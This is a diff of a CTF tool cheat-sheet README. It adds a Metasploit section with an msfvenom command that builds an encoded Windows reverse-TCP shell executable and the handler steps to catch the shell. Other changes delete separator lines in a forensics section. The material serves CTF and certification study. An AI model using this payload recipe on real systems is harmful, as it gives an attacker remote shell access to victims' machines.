@@ -16,6 +16,7 @@ Shashtra is a repo which tells how to use useful tools in CTF etc.
 9. [CRLF Injection](#CRLF-Injection)
 10. [Forensics](#Forensics)
 11. [Steghide](#Steghide)
+12. [Metasploit](#Metasploit)
 
 Hashcat
 ====================
@@ -332,7 +333,7 @@ Forensics
         DumpIt.exe
         win32dd.exe / win64dd.exe - *Has fantastic psexec support, great for IT departments if your EDR solution doesn't support this
       
-      -----------------------------------------------------------
+      
       
  -Volatility
       Volatility is a tool for memory analysis.
@@ -343,7 +344,7 @@ Forensics
       volatility -f MEMORY_FILE.raw --profile=PROFILE malfind -D <Destination Directory usually /tmp>
       volatility -f MEMORY_FILE.raw --profile=PROFILE --pid=PID dlldump -D <Destination Directory>
       
-      ------------------------------------------------------------
+      
       
      Malware Analysis
       
@@ -383,6 +384,34 @@ Steghide
         - man steghide
      
 NOTE: You need a passphrase to encrypt or decrypt a file
+             
+
+             
+             
+
+Metasploit
+====================
+           
+Windows Reverse tcp
+           msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=172.16.104.130 LPORT=31337 -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/1.exe
+           
+           Open Metasploit
+           search exploit 
+           use exploit/multi/handler
+           set payload windows/shell/reverse_tcp
+           show options
+           set LHOST 172.16.104.130
+           set LPORT 31337
+           exploit
+           
+
+           
+           
+           
+           https://github.com/CyberSecurityUP/Guide-CEH-Practical-Master
+             
+             
+             
 
 
 
